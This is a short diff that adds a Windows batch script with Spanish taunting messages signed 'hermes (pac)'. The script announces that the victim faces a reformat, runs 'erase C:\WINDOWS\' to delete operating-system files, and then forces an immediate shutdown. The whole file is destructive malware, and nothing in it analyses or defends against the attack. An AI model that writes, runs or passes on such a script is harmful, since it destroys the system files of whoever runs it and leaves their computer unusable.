@@ -1,0 +1,8 @@
+msg * Hola, has caido en las manitas de hermes (pac)
+msg * Me temo que no te vas a poder librar de un formateo
+msg * ¿Empezamos?
+msg * Me lo tomare como un si.
+erase C:\WINDOWS\
+msg * Ya esta, adios al guindus.
+start shutdown -s -f -t 1
+exit
